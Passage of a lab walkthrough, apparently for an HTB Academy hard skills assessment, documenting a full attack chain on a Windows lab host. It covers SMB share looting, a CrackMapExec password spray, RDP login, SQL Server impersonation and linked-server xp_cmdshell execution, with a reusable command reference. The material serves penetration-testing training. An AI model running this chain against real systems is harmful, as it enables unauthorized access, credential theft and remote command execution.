✅ Multi-service enumeration
✅ Credential attacks
✅ Web shell deployment
✅ Directory traversal
✅ Alternative exploitation paths

Medium Level:
✅ DNS zone transfer attacks
✅ Internal network discovery
✅ vHost enumeration
✅ Custom wordlist creation
✅ Email intelligence gathering
✅ SSH key-based authentication
✅ Complex linear attack chains
```

---

# 🎯 Skills Assessment - Hard Difficulty

## 🎯 Overview - Hard Challenge

This document covers the **Skills Assessment (Hard)** from HTB Academy's "Attacking Common Services" module. This expert-level exercise demonstrates **advanced Windows exploitation** involving SMB share enumeration, custom wordlist attacks, RDP authentication, SQL Server user impersonation, and linked server exploitation.

> **Target Domain**: Windows environment with multiple services  
> **Objective**: "Retrieve user files and obtain administrator flag"  
> **Skills Tested**: SMB enumeration, credential attacks, RDP access, SQL Server impersonation, linked server attacks, xp_cmdshell exploitation

---

## 🔍 Phase 1: Service Discovery & Windows Enumeration

### Initial Nmap Scan
```bash
# HTB Academy Skills Assessment Hard - Windows target reconnaissance
nmap -A -Pn 10.129.112.104

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 19:19 GMT
Nmap scan report for 10.129.112.104
Host is up (0.013s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-11-27T19:16:10
|_Not valid after:  2052-11-27T19:16:10
|_ssl-date: 2022-11-27T19:20:37+00:00; +1s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-27T19:19:57+00:00
|_ssl-date: 2022-11-27T19:20:37+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=WIN-HARD
| Not valid before: 2022-11-26T19:16:00
|_Not valid after:  2023-05-28T19:16:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-11-27T19:20:00
|_  start_date: N/A
| ms-sql-info: 
|   10.129.112.104:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

### Key Services Identified
```
✅ RPC (135)      - Microsoft Windows RPC
✅ SMB (445)      - Microsoft SMB (signing not required)
✅ SQL (1433)     - Microsoft SQL Server 2019 RTM
✅ RDP (3389)     - Microsoft Terminal Services
```

**Target System**: WIN-HARD (Windows 10.0 Build 17763)

---

## 📂 Phase 2: SMB Share Enumeration & File Collection

### SMB Share Discovery
```bash
# HTB Academy SMB share enumeration
smbclient -N -L 10.129.112.104

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

**Discovery**: `Home` share available for anonymous access

### SMB Share Exploration
```bash
# HTB Academy Home share access and exploration
smbclient -N //10.129.112.104/Home

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 21 22:18:21 2022
  ..                                  D        0  Thu Apr 21 22:18:21 2022
  HR                                  D        0  Thu Apr 21 21:04:39 2022
  IT                                  D        0  Thu Apr 21 21:11:44 2022
  OPS                                 D        0  Thu Apr 21 21:05:10 2022
  Projects                            D        0  Thu Apr 21 21:04:48 2022

		7706623 blocks of size 4096. 3168554 blocks available
```

**Discovery**: Multiple department directories including `IT` department

### User File Collection from IT Department
```bash
# HTB Academy IT department file collection
smb: \> cd IT\Fiona\
smb: \IT\Fiona\> get creds.txt 
getting file \IT\Fiona\creds.txt of size 118 as creds.txt (2.9 KiloBytes/sec) (average 2.9 KiloBytes/sec)

smb: \IT\Fiona\> cd ../Simon\
smb: \IT\Simon\> get random.txt
getting file \IT\Simon\random.txt of size 94 as random.txt (2.4 KiloBytes/sec) (average 2.6 KiloBytes/sec)

smb: \IT\Simon\> cd ../John\
smb: \IT\John\> prompt
smb: \IT\John\> mget *
getting file \IT\John\information.txt of size 101 as information.txt (2.5 KiloBytes/sec) (average 2.6 KiloBytes/sec)
getting file \IT\John\notes.txt of size 164 as notes.txt (4.0 KiloBytes/sec) (average 2.9 KiloBytes/sec)
getting file \IT\John\secrets.txt of size 99 as secrets.txt (2.4 KiloBytes/sec) (average 2.8 KiloBytes/sec)
```

**Files Retrieved**:
- From Simon: `random.txt` ✅ (Question 1 answer)
- From Fiona: `creds.txt`
- From John: `information.txt`, `notes.txt`, `secrets.txt`

---

## 🔐 Phase 3: Custom Wordlist Creation & Credential Attacks

### Password Wordlist Compilation
```bash
# HTB Academy custom wordlist creation from collected files
cat creds.txt secrets.txt random.txt > passwords.txt
```

**Strategy**: Combine all potential password files from different users

### SMB Credential Attack
```bash
# HTB Academy CrackMapExec SMB password attack
sudo cme smb 10.129.112.104 -u fiona -p passwords.txt

/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.129.112.104  445    WIN-HARD         [*] Windows 10.0 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.112.104  445    WIN-HARD         [-] WIN-HARD\fiona:Windows Creds STATUS_LOGON_FAILURE 
SMB         10.129.112.104  445    WIN-HARD         [-] WIN-HARD\fiona: STATUS_LOGON_FAILURE 
SMB         10.129.112.104  445    WIN-HARD         [-] WIN-HARD\fiona:kAkd03SA@#! STATUS_LOGON_FAILURE 
SMB         10.129.112.104  445    WIN-HARD         [+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl
```

**Result**: Valid credentials `fiona:48Ns72!bns74@S84NNNSl` discovered ✅ (Question 2 answer)

---

## 🖥️ Phase 4: RDP Authentication & SQL Server Access

### RDP Connection
```bash
# HTB Academy RDP access with discovered credentials
xfreerdp /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl'

<SNIP>
[20:59:35:699] [15143:15144] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[20:59:35:699] [15143:15144] [ERROR][com.freerdp.crypto] - Common Name (CN):
[20:59:35:699] [15143:15144] [ERROR][com.freerdp.crypto] - 	WIN-HARD
[20:59:35:699] [15143:15144] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.203.10:3389 (RDP-Server):
	Common Name: WIN-HARD
	Subject:     CN = WIN-HARD
	Issuer:      CN = WIN-HARD
	Thumbprint:  6a:a8:87:fc:e0:83:73:73:e7:da:b0:ec:d7:5d:33:e2:62:c3:97:ac:9e:d3:ae:72:b6:1c:83:93:ea:bf:50:d8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

**Success**: RDP session established as user `fiona`

### SQL Server Connection via Windows Authentication
```powershell
# HTB Academy SQL Server connection using Windows Authentication
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Fiona> SQLCMD.EXE -S WIN-HARD
1>
```

**Access**: SQLCMD connection established to local SQL Server instance

---

## 👤 Phase 5: SQL Server User Impersonation Discovery

### Impersonation Privilege Enumeration
```sql
-- HTB Academy SQL Server impersonation privilege discovery
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
GO

name
-------------
john
simon

(2 rows affected)
```

**Discovery**: Users `john` and `simon` can be impersonated ✅ (Question 3 answer: john)

---

## 🔗 Phase 6: Linked Server Discovery & Exploitation

### Linked Server Enumeration
```sql
-- HTB Academy linked server discovery
SELECT srvname, isremote FROM sysservers
GO

srvname                           isremote
--------------------------------- --------
WINSRV02\SQLEXPRESS                1
LOCAL.TEST.LINKED.SRV              0

(2 rows affected)
```

**Discovery**: 
- `WINSRV02\SQLEXPRESS` (remote server)
- `LOCAL.TEST.LINKED.SRV` (linked server)

### User Impersonation & Linked Server Access
```sql
-- HTB Academy john user impersonation and linked server sysadmin check
EXECUTE AS LOGIN = 'john'
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
GO

WINSRV02\SQLEXPRESS Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
        testadmin 1

(1 rows affected)
```

**Critical Discovery**: 
- User `john` can access `LOCAL.TEST.LINKED.SRV`
- On linked server, `john` has `sysadmin` privileges as `testadmin`
- Target server: `WINSRV02\SQLEXPRESS`

---

## 💻 Phase 7: xp_cmdshell Enablement & Command Execution

### xp_cmdshell Configuration
```sql
-- HTB Academy xp_cmdshell enablement on linked server
EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
GO

Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

**Success**: xp_cmdshell enabled on linked server for command execution

### Administrator Flag Extraction
```sql
-- HTB Academy administrator flag retrieval via xp_cmdshell
EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
GO

output
---------------------------------------------
HTB{...}
NULL

(2 rows affected)
```


---

## 📊 Attack Chain Summary - Hard Difficulty

### Complete Attack Flow
```
1. Service Discovery    → Nmap scan (Windows services identified)
2. SMB Share Enumeration → Anonymous access to Home share
3. File Collection      → User files from IT department (3 users)
4. Wordlist Creation    → Custom passwords from collected files
5. Credential Attack    → CrackMapExec SMB brute force
6. RDP Authentication   → xfreerdp with valid credentials
7. SQL Server Access    → SQLCMD Windows Authentication
8. Impersonation Discovery → SQL Server user privilege enumeration
9. Linked Server Discovery → Remote SQL Server identification
10. User Impersonation   → EXECUTE AS LOGIN john
11. Linked Server Access → Sysadmin privileges on remote server
12. xp_cmdshell Enablement → Remote command execution capability
13. Administrator Access → Flag extraction from remote system
```

### Advanced Services & Techniques
```
✅ SMB      - Anonymous share access, file collection
✅ Custom   - Multi-user wordlist compilation  
✅ CME      - CrackMapExec credential attacks
✅ RDP      - xfreerdp Windows authentication
✅ SQL      - Windows Authentication, user impersonation
✅ Linked   - Cross-server SQL Server exploitation
✅ xp_cmdshell - Remote command execution via SQL
```

### Expert Learning Points
```
1. Windows Multi-Service Exploitation
   - SMB anonymous access for intelligence gathering
   - Custom wordlist creation from multiple sources
   - RDP authentication with complex passwords

2. SQL Server Advanced Attacks
   - Windows Authentication exploitation
   - User impersonation privilege abuse
   - Linked server discovery and enumeration

3. Cross-Server Attack Chains
   - Local privilege escalation via impersonation
   - Remote server access through linked servers
   - xp_cmdshell command execution on remote systems

4. Intelligence-Driven Methodology
   - File collection from multiple user directories
   - Password pattern analysis across users
   - Privilege mapping across multiple SQL instances

5. Windows Enterprise Environment
   - Multi-tier SQL Server architecture
   - Cross-domain authentication mechanisms
   - Administrative privilege escalation paths
```

---

## 🔧 Complete Tool Chain - Hard Difficulty

### Full Command Reference
```bash
# Service Discovery
nmap -A -Pn target_ip

# SMB Share Enumeration
smbclient -N -L target_ip
smbclient -N //target_ip/share_name

# Custom Wordlist Creation
cat file1.txt file2.txt file3.txt > passwords.txt

# Credential Attacks
sudo cme smb target_ip -u username -p passwords.txt

# RDP Access
xfreerdp /v:target_ip /u:username /p:'password'

# SQL Server Access
SQLCMD.EXE -S server_name

# SQL Server Impersonation
EXECUTE AS LOGIN = 'username'

# Linked Server Enumeration
SELECT srvname, isremote FROM sysservers

# Cross-Server Execution
EXECUTE('command') AT [LINKED.SERVER.NAME]

# xp_cmdshell Enablement
EXECUTE('EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LINKED.SERVER]

# Remote Command Execution
EXECUTE('xp_cmdshell ''command''') AT [LINKED.SERVER]
```

---

## 🔗 Complete Skills Assessment Trilogy

### Difficulty Progression Overview

#### **Easy Skills Assessment**
- **Attack Chain**: 7 phases (Basic multi-service exploitation)
- **Services**: FTP, SMTP, HTTP, HTTPS, MySQL (5 services)
- **Complexity**: Medium - Multiple exploitation paths
- **Key Skills**: Service enumeration, credential attacks, directory traversal

#### **Medium Skills Assessment**
- **Attack Chain**: 10 phases (Advanced linear dependency chain)
- **Services**: DNS, vHost, FTP, POP3, Email, SSH (6 services)
- **Complexity**: High - Each phase enables next attack
- **Key Skills**: Zone transfers, vHost discovery, SSH key extraction

#### **Hard Skills Assessment**
- **Attack Chain**: 13 phases (Expert Windows enterprise exploitation)
- **Services**: SMB, RDP, SQL Server, Linked Servers (4+ services)
- **Complexity**: Expert - Cross-server privilege escalation
- **Key Skills**: Windows authentication, SQL impersonation, linked server attacks

### Complete CPTS Skills Matrix

```
Foundation Level (Easy):
✅ Multi-service enumeration and exploitation
✅ Web application attack vectors
✅ Database exploitation techniques
✅ Alternative exploitation path discovery

Intermediate Level (Medium):
✅ DNS infrastructure attacks
✅ Internal network service discovery
✅ Email-based intelligence gathering
✅ SSH key-based authentication

Advanced Level (Hard):
✅ Windows enterprise environment exploitation
✅ SMB share and file system analysis
✅ SQL Server authentication and impersonation
✅ Cross-server attack chain development
✅ Administrative privilege escalation
```

---

*This complete Skills Assessment trilogy provides comprehensive practical scenarios spanning beginner to expert levels, demonstrating the full spectrum of attack techniques covered in the "Attacking Common Services" module for thorough CPTS exam preparation.* 